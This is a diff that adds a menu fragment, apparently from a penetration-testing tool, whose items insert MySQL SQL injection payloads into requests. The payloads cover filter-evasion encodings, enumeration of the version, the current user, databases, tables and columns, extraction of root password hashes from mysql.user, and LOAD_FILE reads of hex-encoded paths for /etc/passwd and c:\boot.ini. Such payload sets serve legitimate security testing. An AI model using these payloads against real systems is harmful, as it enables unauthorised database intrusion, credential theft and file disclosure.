@@ -1,0 +1,25 @@
+  <li>Filter Evasion
+  <menu>
+   <li onclick="quickinject:run(forge.str_escape_mysql)">String Escape (CHAR)</li>
+   <li onclick="quickinject:run(forge.mysql_concat)">String Concatenation</li>
+   <li style="foreground-image: url(Huntpad.scx#images\icon_pi.png);" onclick="quickinject:run(forge.mysql_intrep)">Integer Representation</li>
+   <li onclick="quickinject:run(forge.mysql_percobfusc)">Percent Obfuscation</li>
+  </menu>
+  </li>
+  <hr/>
+  <li.info onclick="reqbuilder.edit.insert([[CONCAT_WS(0x3a,version(),database(),user())]])">Basic Information</li>
+  <li.info onclick="reqbuilder.edit.insert([[CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root']])">Database Credentials (Priv.)</li>
+  <hr/>
+  <li.info onclick="reqbuilder.edit.insert('@@version')">Version</li>
+  <li.user onclick="reqbuilder.edit.insert('user()')">Current User</li>
+  <li.users onclick="reqbuilder.edit.insert('user FROM mysql.user')">Users</li>
+  <li.databases onclick="reqbuilder.edit.insert('schema_name FROM information_schema.schemata')">Databases (&gt;= 5.0)</li>
+  <li.databases onclick="reqbuilder.edit.insert('distinct(db) FROM mysql.db')">Databases (Privileged)</li>
+  <li.columns onclick="reqbuilder.edit.insert([[table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema']])">Columns</li>
+  <li.tables onclick="reqbuilder.edit.insert([[table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema']])">Tables</li>
+  <li>Files
+   <menu>
+   <li.configfile onclick="reqbuilder.edit.insert('LOAD_FILE(0x633A5C626F6F742E696E69)')">c:\boot.ini</li>
+   <li.configfile onclick="reqbuilder.edit.insert('LOAD_FILE(0x2F6574632F706173737764)')">/etc/passwd</li>
+   </menu>
+  </li>
